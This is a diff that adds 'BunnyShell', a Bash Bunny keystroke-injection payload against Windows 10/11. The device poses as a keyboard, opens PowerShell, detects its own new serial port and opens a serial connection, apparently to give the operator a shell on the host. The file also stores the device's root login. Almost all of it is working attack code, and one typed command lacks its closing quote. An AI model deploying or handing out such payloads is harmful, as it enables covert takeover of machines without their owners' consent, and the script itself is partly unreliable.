@@ -1,0 +1,33 @@
+#!/bin/bash
+#
+# Title:         BunnyShell
+# Author:        CoulsTech
+# Version:       0.1
+# Target:        Windows 10/11
+# Category:      General
+
+# Setup
+LED SETUP
+ATTACKMODE HID
+
+# Configuration
+BAUD="115200"
+DATA_BITS="8"
+PARITY_BIT="No"
+STOP_BIT="1"
+BUNNY_USER="root"
+BUNNY_PASS="hak5bunny"
+COM_SLEEP="5" #Must match $Race_Delay/1000
+RACE_DELAY="5000" #Must match $COM_SLEEP*5
+
+# Payload
+RUN WIN "powershell -NoExit"
+QUACK "\$PRESERIALBUNNY = [System.IO.Ports.SerialPort]::GetPortNames(); Start-Sleep -Seconds 1; \$POSTSERIALBUNNY = [System.IO.Ports.SerialPort]::GetPortNames(); \$BUNNYCOM = (Compare-Object \$PRESERIALBUNNY \$POSTSERIALBUNNY | Where-Object { \$_.SideIndicator -eq '=>' }).InputObject"
+QUACK ENTER
+ATTACKMODE HID SERIAL #5 Second race for the A-B math (needs better solution)
+QUACK DELAY $RACE_DELAY
+QUACK STRING "\$SERIAL = New-Object System.IO.Ports.SerialPort \$BUNNYCOM,$BAUD,'$DATA_BITS',$PARITY_BIT,'$STOP_BIT'
+QUACK ENTER
+QUACK STRING "\$SERIAL.Open()"
+QUACK ENTER
+LED FINISH
